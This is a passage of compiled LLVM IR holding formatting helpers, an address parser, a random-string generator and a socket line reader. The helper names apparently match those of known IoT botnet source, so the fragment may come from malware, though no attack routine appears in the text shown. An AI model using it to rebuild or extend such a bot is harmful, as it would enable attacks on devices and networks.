; <label>:90:                                     ; preds = %85
  %91 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 3
  %92 = load i8*, i8** %91, align 8
  %93 = getelementptr i8, i8* %92, i32 %88
  %94 = bitcast i8* %93 to i32*
  %95 = add i32 %88, 8
  store i32 %95, i32* %87, align 8
  br label %101

; <label>:96:                                     ; preds = %85
  %97 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %86, i32 0, i32 2
  %98 = load i8*, i8** %97, align 8
  %99 = bitcast i8* %98 to i32*
  %100 = getelementptr i8, i8* %98, i32 8
  store i8* %100, i8** %97, align 8
  br label %101

; <label>:101:                                    ; preds = %96, %90
  %102 = phi i32* [ %94, %90 ], [ %99, %96 ]
  %103 = load i32, i32* %102, align 4
  %104 = sext i32 %103 to i64
  %105 = inttoptr i64 %104 to i8*
  store i8* %105, i8** %11, align 8
  %106 = load i8**, i8*** %4, align 8
  %107 = load i8*, i8** %11, align 8
  %108 = icmp ne i8* %107, null
  br i1 %108, label %109, label %111

; <label>:109:                                    ; preds = %101
  %110 = load i8*, i8** %11, align 8
  br label %112

; <label>:111:                                    ; preds = %101
  br label %112

; <label>:112:                                    ; preds = %111, %109
  %113 = phi i8* [ %110, %109 ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @.str.36, i32 0, i32 0), %111 ]
  %114 = load i32, i32* %7, align 4
  %115 = load i32, i32* %8, align 4
  %116 = call i32 @prints(i8** %106, i8* %113, i32 %114, i32 %115)
  %117 = load i32, i32* %9, align 4
  %118 = add nsw i32 %117, %116
  store i32 %118, i32* %9, align 4
  br label %283

; <label>:119:                                    ; preds = %80
  %120 = load i8*, i8** %5, align 8
  %121 = load i8, i8* %120, align 1
  %122 = zext i8 %121 to i32
  %123 = icmp eq i32 %122, 100
  br i1 %123, label %124, label %149

; <label>:124:                                    ; preds = %119
  %125 = load i8**, i8*** %4, align 8
  %126 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %127 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 0
  %128 = load i32, i32* %127, align 8
  %129 = icmp ule i32 %128, 40
  br i1 %129, label %130, label %136

; <label>:130:                                    ; preds = %124
  %131 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 3
  %132 = load i8*, i8** %131, align 8
  %133 = getelementptr i8, i8* %132, i32 %128
  %134 = bitcast i8* %133 to i32*
  %135 = add i32 %128, 8
  store i32 %135, i32* %127, align 8
  br label %141

; <label>:136:                                    ; preds = %124
  %137 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %126, i32 0, i32 2
  %138 = load i8*, i8** %137, align 8
  %139 = bitcast i8* %138 to i32*
  %140 = getelementptr i8, i8* %138, i32 8
  store i8* %140, i8** %137, align 8
  br label %141

; <label>:141:                                    ; preds = %136, %130
  %142 = phi i32* [ %134, %130 ], [ %139, %136 ]
  %143 = load i32, i32* %142, align 4
  %144 = load i32, i32* %7, align 4
  %145 = load i32, i32* %8, align 4
  %146 = call i32 @printi(i8** %125, i32 %143, i32 10, i32 1, i32 %144, i32 %145, i32 97)
  %147 = load i32, i32* %9, align 4
  %148 = add nsw i32 %147, %146
  store i32 %148, i32* %9, align 4
  br label %283

; <label>:149:                                    ; preds = %119
  %150 = load i8*, i8** %5, align 8
  %151 = load i8, i8* %150, align 1
  %152 = zext i8 %151 to i32
  %153 = icmp eq i32 %152, 120
  br i1 %153, label %154, label %179

; <label>:154:                                    ; preds = %149
  %155 = load i8**, i8*** %4, align 8
  %156 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %157 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 0
  %158 = load i32, i32* %157, align 8
  %159 = icmp ule i32 %158, 40
  br i1 %159, label %160, label %166

; <label>:160:                                    ; preds = %154
  %161 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 3
  %162 = load i8*, i8** %161, align 8
  %163 = getelementptr i8, i8* %162, i32 %158
  %164 = bitcast i8* %163 to i32*
  %165 = add i32 %158, 8
  store i32 %165, i32* %157, align 8
  br label %171

; <label>:166:                                    ; preds = %154
  %167 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %156, i32 0, i32 2
  %168 = load i8*, i8** %167, align 8
  %169 = bitcast i8* %168 to i32*
  %170 = getelementptr i8, i8* %168, i32 8
  store i8* %170, i8** %167, align 8
  br label %171

; <label>:171:                                    ; preds = %166, %160
  %172 = phi i32* [ %164, %160 ], [ %169, %166 ]
  %173 = load i32, i32* %172, align 4
  %174 = load i32, i32* %7, align 4
  %175 = load i32, i32* %8, align 4
  %176 = call i32 @printi(i8** %155, i32 %173, i32 16, i32 0, i32 %174, i32 %175, i32 97)
  %177 = load i32, i32* %9, align 4
  %178 = add nsw i32 %177, %176
  store i32 %178, i32* %9, align 4
  br label %283

; <label>:179:                                    ; preds = %149
  %180 = load i8*, i8** %5, align 8
  %181 = load i8, i8* %180, align 1
  %182 = zext i8 %181 to i32
  %183 = icmp eq i32 %182, 88
  br i1 %183, label %184, label %209

; <label>:184:                                    ; preds = %179
  %185 = load i8**, i8*** %4, align 8
  %186 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %187 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 0
  %188 = load i32, i32* %187, align 8
  %189 = icmp ule i32 %188, 40
  br i1 %189, label %190, label %196

; <label>:190:                                    ; preds = %184
  %191 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 3
  %192 = load i8*, i8** %191, align 8
  %193 = getelementptr i8, i8* %192, i32 %188
  %194 = bitcast i8* %193 to i32*
  %195 = add i32 %188, 8
  store i32 %195, i32* %187, align 8
  br label %201

; <label>:196:                                    ; preds = %184
  %197 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %186, i32 0, i32 2
  %198 = load i8*, i8** %197, align 8
  %199 = bitcast i8* %198 to i32*
  %200 = getelementptr i8, i8* %198, i32 8
  store i8* %200, i8** %197, align 8
  br label %201

; <label>:201:                                    ; preds = %196, %190
  %202 = phi i32* [ %194, %190 ], [ %199, %196 ]
  %203 = load i32, i32* %202, align 4
  %204 = load i32, i32* %7, align 4
  %205 = load i32, i32* %8, align 4
  %206 = call i32 @printi(i8** %185, i32 %203, i32 16, i32 0, i32 %204, i32 %205, i32 65)
  %207 = load i32, i32* %9, align 4
  %208 = add nsw i32 %207, %206
  store i32 %208, i32* %9, align 4
  br label %283

; <label>:209:                                    ; preds = %179
  %210 = load i8*, i8** %5, align 8
  %211 = load i8, i8* %210, align 1
  %212 = zext i8 %211 to i32
  %213 = icmp eq i32 %212, 117
  br i1 %213, label %214, label %239

; <label>:214:                                    ; preds = %209
  %215 = load i8**, i8*** %4, align 8
  %216 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %217 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 0
  %218 = load i32, i32* %217, align 8
  %219 = icmp ule i32 %218, 40
  br i1 %219, label %220, label %226

; <label>:220:                                    ; preds = %214
  %221 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 3
  %222 = load i8*, i8** %221, align 8
  %223 = getelementptr i8, i8* %222, i32 %218
  %224 = bitcast i8* %223 to i32*
  %225 = add i32 %218, 8
  store i32 %225, i32* %217, align 8
  br label %231

; <label>:226:                                    ; preds = %214
  %227 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %216, i32 0, i32 2
  %228 = load i8*, i8** %227, align 8
  %229 = bitcast i8* %228 to i32*
  %230 = getelementptr i8, i8* %228, i32 8
  store i8* %230, i8** %227, align 8
  br label %231

; <label>:231:                                    ; preds = %226, %220
  %232 = phi i32* [ %224, %220 ], [ %229, %226 ]
  %233 = load i32, i32* %232, align 4
  %234 = load i32, i32* %7, align 4
  %235 = load i32, i32* %8, align 4
  %236 = call i32 @printi(i8** %215, i32 %233, i32 10, i32 0, i32 %234, i32 %235, i32 97)
  %237 = load i32, i32* %9, align 4
  %238 = add nsw i32 %237, %236
  store i32 %238, i32* %9, align 4
  br label %283

; <label>:239:                                    ; preds = %209
  %240 = load i8*, i8** %5, align 8
  %241 = load i8, i8* %240, align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 99
  br i1 %243, label %244, label %273

; <label>:244:                                    ; preds = %239
  %245 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %246 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 0
  %247 = load i32, i32* %246, align 8
  %248 = icmp ule i32 %247, 40
  br i1 %248, label %249, label %255

; <label>:249:                                    ; preds = %244
  %250 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 3
  %251 = load i8*, i8** %250, align 8
  %252 = getelementptr i8, i8* %251, i32 %247
  %253 = bitcast i8* %252 to i32*
  %254 = add i32 %247, 8
  store i32 %254, i32* %246, align 8
  br label %260

; <label>:255:                                    ; preds = %244
  %256 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %245, i32 0, i32 2
  %257 = load i8*, i8** %256, align 8
  %258 = bitcast i8* %257 to i32*
  %259 = getelementptr i8, i8* %257, i32 8
  store i8* %259, i8** %256, align 8
  br label %260

; <label>:260:                                    ; preds = %255, %249
  %261 = phi i32* [ %253, %249 ], [ %258, %255 ]
  %262 = load i32, i32* %261, align 4
  %263 = trunc i32 %262 to i8
  %264 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %263, i8* %264, align 1
  %265 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %265, align 1
  %266 = load i8**, i8*** %4, align 8
  %267 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %268 = load i32, i32* %7, align 4
  %269 = load i32, i32* %8, align 4
  %270 = call i32 @prints(i8** %266, i8* %267, i32 %268, i32 %269)
  %271 = load i32, i32* %9, align 4
  %272 = add nsw i32 %271, %270
  store i32 %272, i32* %9, align 4
  br label %283

; <label>:273:                                    ; preds = %239
  br label %282

; <label>:274:                                    ; preds = %17
  br label %275

; <label>:275:                                    ; preds = %274, %35
  %276 = load i8**, i8*** %4, align 8
  %277 = load i8*, i8** %5, align 8
  %278 = load i8, i8* %277, align 1
  %279 = zext i8 %278 to i32
  call void @printchar(i8** %276, i32 %279)
  %280 = load i32, i32* %9, align 4
  %281 = add nsw i32 %280, 1
  store i32 %281, i32* %9, align 4
  br label %282

; <label>:282:                                    ; preds = %275, %273
  br label %283

; <label>:283:                                    ; preds = %282, %260, %231, %201, %171, %141, %112
  %284 = load i8*, i8** %5, align 8
  %285 = getelementptr inbounds i8, i8* %284, i32 1
  store i8* %285, i8** %5, align 8
  br label %12

; <label>:286:                                    ; preds = %29, %12
  %287 = load i8**, i8*** %4, align 8
  %288 = icmp ne i8** %287, null
  br i1 %288, label %289, label %292

; <label>:289:                                    ; preds = %286
  %290 = load i8**, i8*** %4, align 8
  %291 = load i8*, i8** %290, align 8
  store i8 0, i8* %291, align 1
  br label %292

; <label>:292:                                    ; preds = %289, %286
  %293 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %294 = bitcast %struct.__va_list_tag* %293 to i8*
  call void @llvm.va_end(i8* %294)
  %295 = load i32, i32* %9, align 4
  ret i32 %295
}

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #6

declare i64 @send(i32, i8*, i64, i32) #2

; Function Attrs: nounwind
declare void @free(i8*) #3

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %42

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %24, %15
  %18 = load i8*, i8** %12, align 8
  %19 = load i8, i8* %18, align 1
  %20 = icmp ne i8 %19, 0
  br i1 %20, label %21, label %27

; <label>:21:                                     ; preds = %17
  %22 = load i32, i32* %11, align 4
  %23 = add nsw i32 %22, 1
  store i32 %23, i32* %11, align 4
  br label %24

; <label>:24:                                     ; preds = %21
  %25 = load i8*, i8** %12, align 8
  %26 = getelementptr inbounds i8, i8* %25, i32 1
  store i8* %26, i8** %12, align 8
  br label %17

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %11, align 4
  %29 = load i32, i32* %7, align 4
  %30 = icmp sge i32 %28, %29
  br i1 %30, label %31, label %32

; <label>:31:                                     ; preds = %27
  store i32 0, i32* %7, align 4
  br label %36

; <label>:32:                                     ; preds = %27
  %33 = load i32, i32* %11, align 4
  %34 = load i32, i32* %7, align 4
  %35 = sub nsw i32 %34, %33
  store i32 %35, i32* %7, align 4
  br label %36

; <label>:36:                                     ; preds = %32, %31
  %37 = load i32, i32* %8, align 4
  %38 = and i32 %37, 2
  %39 = icmp ne i32 %38, 0
  br i1 %39, label %40, label %41

; <label>:40:                                     ; preds = %36
  store i32 48, i32* %10, align 4
  br label %41

; <label>:41:                                     ; preds = %40, %36
  br label %42

; <label>:42:                                     ; preds = %41, %4
  %43 = load i32, i32* %8, align 4
  %44 = and i32 %43, 1
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %59, label %46

; <label>:46:                                     ; preds = %42
  br label %47

; <label>:47:                                     ; preds = %55, %46
  %48 = load i32, i32* %7, align 4
  %49 = icmp sgt i32 %48, 0
  br i1 %49, label %50, label %58

; <label>:50:                                     ; preds = %47
  %51 = load i8**, i8*** %5, align 8
  %52 = load i32, i32* %10, align 4
  call void @printchar(i8** %51, i32 %52)
  %53 = load i32, i32* %9, align 4
  %54 = add nsw i32 %53, 1
  store i32 %54, i32* %9, align 4
  br label %55

; <label>:55:                                     ; preds = %50
  %56 = load i32, i32* %7, align 4
  %57 = add nsw i32 %56, -1
  store i32 %57, i32* %7, align 4
  br label %47

; <label>:58:                                     ; preds = %47
  br label %59

; <label>:59:                                     ; preds = %58, %42
  br label %60

; <label>:60:                                     ; preds = %71, %59
  %61 = load i8*, i8** %6, align 8
  %62 = load i8, i8* %61, align 1
  %63 = icmp ne i8 %62, 0
  br i1 %63, label %64, label %74

; <label>:64:                                     ; preds = %60
  %65 = load i8**, i8*** %5, align 8
  %66 = load i8*, i8** %6, align 8
  %67 = load i8, i8* %66, align 1
  %68 = zext i8 %67 to i32
  call void @printchar(i8** %65, i32 %68)
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 1
  store i32 %70, i32* %9, align 4
  br label %71

; <label>:71:                                     ; preds = %64
  %72 = load i8*, i8** %6, align 8
  %73 = getelementptr inbounds i8, i8* %72, i32 1
  store i8* %73, i8** %6, align 8
  br label %60

; <label>:74:                                     ; preds = %60
  br label %75

; <label>:75:                                     ; preds = %83, %74
  %76 = load i32, i32* %7, align 4
  %77 = icmp sgt i32 %76, 0
  br i1 %77, label %78, label %86

; <label>:78:                                     ; preds = %75
  %79 = load i8**, i8*** %5, align 8
  %80 = load i32, i32* %10, align 4
  call void @printchar(i8** %79, i32 %80)
  %81 = load i32, i32* %9, align 4
  %82 = add nsw i32 %81, 1
  store i32 %82, i32* %9, align 4
  br label %83

; <label>:83:                                     ; preds = %78
  %84 = load i32, i32* %7, align 4
  %85 = add nsw i32 %84, -1
  store i32 %85, i32* %7, align 4
  br label %75

; <label>:86:                                     ; preds = %75
  %87 = load i32, i32* %9, align 4
  ret i32 %87
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @printi(i8**, i32, i32, i32, i32, i32, i32) #0 {
  %8 = alloca i32, align 4
  %9 = alloca i8**, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca [12 x i8], align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca i32, align 4
  store i8** %0, i8*** %9, align 8
  store i32 %1, i32* %10, align 4
  store i32 %2, i32* %11, align 4
  store i32 %3, i32* %12, align 4
  store i32 %4, i32* %13, align 4
  store i32 %5, i32* %14, align 4
  store i32 %6, i32* %15, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %22 = load i32, i32* %10, align 4
  store i32 %22, i32* %21, align 4
  %23 = load i32, i32* %10, align 4
  %24 = icmp eq i32 %23, 0
  br i1 %24, label %25, label %33

; <label>:25:                                     ; preds = %7
  %26 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 0
  store i8 48, i8* %26, align 1
  %27 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i64 0, i64 1
  store i8 0, i8* %27, align 1
  %28 = load i8**, i8*** %9, align 8
  %29 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %30 = load i32, i32* %13, align 4
  %31 = load i32, i32* %14, align 4
  %32 = call i32 @prints(i8** %28, i8* %29, i32 %30, i32 %31)
  store i32 %32, i32* %8, align 4
  br label %102

; <label>:33:                                     ; preds = %7
  %34 = load i32, i32* %12, align 4
  %35 = icmp ne i32 %34, 0
  br i1 %35, label %36, label %45

; <label>:36:                                     ; preds = %33
  %37 = load i32, i32* %11, align 4
  %38 = icmp eq i32 %37, 10
  br i1 %38, label %39, label %45

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* %10, align 4
  %41 = icmp slt i32 %40, 0
  br i1 %41, label %42, label %45

; <label>:42:                                     ; preds = %39
  store i32 1, i32* %19, align 4
  %43 = load i32, i32* %10, align 4
  %44 = sub nsw i32 0, %43
  store i32 %44, i32* %21, align 4
  br label %45

; <label>:45:                                     ; preds = %42, %39, %36, %33
  %46 = getelementptr inbounds [12 x i8], [12 x i8]* %16, i32 0, i32 0
  %47 = getelementptr inbounds i8, i8* %46, i64 12
  %48 = getelementptr inbounds i8, i8* %47, i64 -1
  store i8* %48, i8** %17, align 8
  %49 = load i8*, i8** %17, align 8
  store i8 0, i8* %49, align 1
  br label %50

; <label>:50:                                     ; preds = %65, %45
  %51 = load i32, i32* %21, align 4
  %52 = icmp ne i32 %51, 0
  br i1 %52, label %53, label %74

; <label>:53:                                     ; preds = %50
  %54 = load i32, i32* %21, align 4
  %55 = load i32, i32* %11, align 4
  %56 = urem i32 %54, %55
  store i32 %56, i32* %18, align 4
  %57 = load i32, i32* %18, align 4
  %58 = icmp sge i32 %57, 10
  br i1 %58, label %59, label %65

; <label>:59:                                     ; preds = %53
  %60 = load i32, i32* %15, align 4
  %61 = sub nsw i32 %60, 48
  %62 = sub nsw i32 %61, 10
  %63 = load i32, i32* %18, align 4
  %64 = add nsw i32 %63, %62
  store i32 %64, i32* %18, align 4
  br label %65

; <label>:65:                                     ; preds = %59, %53
  %66 = load i32, i32* %18, align 4
  %67 = add nsw i32 %66, 48
  %68 = trunc i32 %67 to i8
  %69 = load i8*, i8** %17, align 8
  %70 = getelementptr inbounds i8, i8* %69, i32 -1
  store i8* %70, i8** %17, align 8
  store i8 %68, i8* %70, align 1
  %71 = load i32, i32* %11, align 4
  %72 = load i32, i32* %21, align 4
  %73 = udiv i32 %72, %71
  store i32 %73, i32* %21, align 4
  br label %50

; <label>:74:                                     ; preds = %50
  %75 = load i32, i32* %19, align 4
  %76 = icmp ne i32 %75, 0
  br i1 %76, label %77, label %94

; <label>:77:                                     ; preds = %74
  %78 = load i32, i32* %13, align 4
  %79 = icmp ne i32 %78, 0
  br i1 %79, label %80, label %90

; <label>:80:                                     ; preds = %77
  %81 = load i32, i32* %14, align 4
  %82 = and i32 %81, 2
  %83 = icmp ne i32 %82, 0
  br i1 %83, label %84, label %90

; <label>:84:                                     ; preds = %80
  %85 = load i8**, i8*** %9, align 8
  call void @printchar(i8** %85, i32 45)
  %86 = load i32, i32* %20, align 4
  %87 = add nsw i32 %86, 1
  store i32 %87, i32* %20, align 4
  %88 = load i32, i32* %13, align 4
  %89 = add nsw i32 %88, -1
  store i32 %89, i32* %13, align 4
  br label %93

; <label>:90:                                     ; preds = %80, %77
  %91 = load i8*, i8** %17, align 8
  %92 = getelementptr inbounds i8, i8* %91, i32 -1
  store i8* %92, i8** %17, align 8
  store i8 45, i8* %92, align 1
  br label %93

; <label>:93:                                     ; preds = %90, %84
  br label %94

; <label>:94:                                     ; preds = %93, %74
  %95 = load i32, i32* %20, align 4
  %96 = load i8**, i8*** %9, align 8
  %97 = load i8*, i8** %17, align 8
  %98 = load i32, i32* %13, align 4
  %99 = load i32, i32* %14, align 4
  %100 = call i32 @prints(i8** %96, i8* %97, i32 %98, i32 %99)
  %101 = add nsw i32 %95, %100
  store i32 %101, i32* %8, align 4
  br label %102

; <label>:102:                                    ; preds = %94, %25
  %103 = load i32, i32* %8, align 4
  ret i32 %103
}

; Function Attrs: noinline nounwind uwtable
define internal void @printchar(i8**, i32) #0 {
  %3 = alloca i8**, align 8
  %4 = alloca i32, align 4
  store i8** %0, i8*** %3, align 8
  store i32 %1, i32* %4, align 4
  %5 = load i8**, i8*** %3, align 8
  %6 = icmp ne i8** %5, null
  br i1 %6, label %7, label %15

; <label>:7:                                      ; preds = %2
  %8 = load i32, i32* %4, align 4
  %9 = trunc i32 %8 to i8
  %10 = load i8**, i8*** %3, align 8
  %11 = load i8*, i8** %10, align 8
  store i8 %9, i8* %11, align 1
  %12 = load i8**, i8*** %3, align 8
  %13 = load i8*, i8** %12, align 8
  %14 = getelementptr inbounds i8, i8* %13, i32 1
  store i8* %14, i8** %12, align 8
  br label %18

; <label>:15:                                     ; preds = %2
  %16 = bitcast i32* %4 to i8*
  %17 = call i64 @write(i32 1, i8* %16, i64 1)
  br label %18

; <label>:18:                                     ; preds = %15, %7
  ret void
}

declare i64 @write(i32, i8*, i64) #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %14

; <label>:13:                                     ; preds = %2
  store i32 0, i32* %3, align 4
  br label %14

; <label>:14:                                     ; preds = %13, %12
  %15 = load i32, i32* %3, align 4
  ret i32 %15
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %19, %2
  %7 = load i32, i32* %5, align 4
  %8 = load i32, i32* %4, align 4
  %9 = icmp slt i32 %7, %8
  br i1 %9, label %10, label %22

; <label>:10:                                     ; preds = %6
  %11 = call i32 @rand_cmwc()
  %12 = urem i32 %11, 26
  %13 = add i32 %12, 65
  %14 = trunc i32 %13 to i8
  %15 = load i8*, i8** %3, align 8
  %16 = load i32, i32* %5, align 4
  %17 = sext i32 %16 to i64
  %18 = getelementptr inbounds i8, i8* %15, i64 %17
  store i8 %14, i8* %18, align 1
  br label %19

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* %5, align 4
  %21 = add nsw i32 %20, 1
  store i32 %21, i32* %5, align 4
  br label %6

; <label>:22:                                     ; preds = %6
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %26 = getelementptr inbounds [16 x i64], [16 x i64]* %25, i64 0, i64 0
  %27 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %26) #6, !srcloc !1
  %28 = extractvalue { i64, i64* } %27, 0
  %29 = extractvalue { i64, i64* } %27, 1
  %30 = trunc i64 %28 to i32
  store i32 %30, i32* %10, align 4
  %31 = ptrtoint i64* %29 to i64
  %32 = trunc i64 %31 to i32
  store i32 %32, i32* %11, align 4
  br label %33

; <label>:33:                                     ; preds = %24
  %34 = load i32, i32* %5, align 4
  %35 = srem i32 %34, 64
  %36 = zext i32 %35 to i64
  %37 = shl i64 1, %36
  %38 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %39 = load i32, i32* %5, align 4
  %40 = sdiv i32 %39, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds [16 x i64], [16 x i64]* %38, i64 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %37
  store i64 %44, i64* %42, align 8
  %45 = load i32, i32* %5, align 4
  %46 = add nsw i32 %45, 1
  %47 = call i32 @select(i32 %46, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %47, i32* %12, align 4
  %48 = icmp sle i32 %47, 0
  br i1 %48, label %49, label %86

; <label>:49:                                     ; preds = %33
  br label %50

; <label>:50:                                     ; preds = %81, %49
  %51 = load i32, i32* %13, align 4
  %52 = icmp slt i32 %51, 10
  br i1 %52, label %53, label %85

; <label>:53:                                     ; preds = %50
  %54 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %54, align 8
  %55 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %55, align 8
  br label %56

; <label>:56:                                     ; preds = %53
  %57 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %57, i64 0, i64 0
  %59 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %58) #6, !srcloc !2
  %60 = extractvalue { i64, i64* } %59, 0
  %61 = extractvalue { i64, i64* } %59, 1
  %62 = trunc i64 %60 to i32
  store i32 %62, i32* %14, align 4
  %63 = ptrtoint i64* %61 to i64
  %64 = trunc i64 %63 to i32
  store i32 %64, i32* %15, align 4
  br label %65

; <label>:65:                                     ; preds = %56
  %66 = load i32, i32* %5, align 4
  %67 = srem i32 %66, 64
  %68 = zext i32 %67 to i64
  %69 = shl i64 1, %68
  %70 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %71 = load i32, i32* %5, align 4
  %72 = sdiv i32 %71, 64
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds [16 x i64], [16 x i64]* %70, i64 0, i64 %73
  %75 = load i64, i64* %74, align 8
  %76 = or i64 %75, %69
  store i64 %76, i64* %74, align 8
  %77 = load i32, i32* %5, align 4
  %78 = add nsw i32 %77, 1
  %79 = call i32 @select(i32 %78, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %79, i32* %12, align 4
  %80 = icmp sle i32 %79, 0
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %65
  %82 = load i32, i32* %13, align 4
  %83 = add nsw i32 %82, 1
  store i32 %83, i32* %13, align 4
  br label %50

; <label>:84:                                     ; preds = %65
  br label %85

; <label>:85:                                     ; preds = %84, %50
  br label %86

; <label>:86:                                     ; preds = %85, %33
  store i32 0, i32* %18, align 4
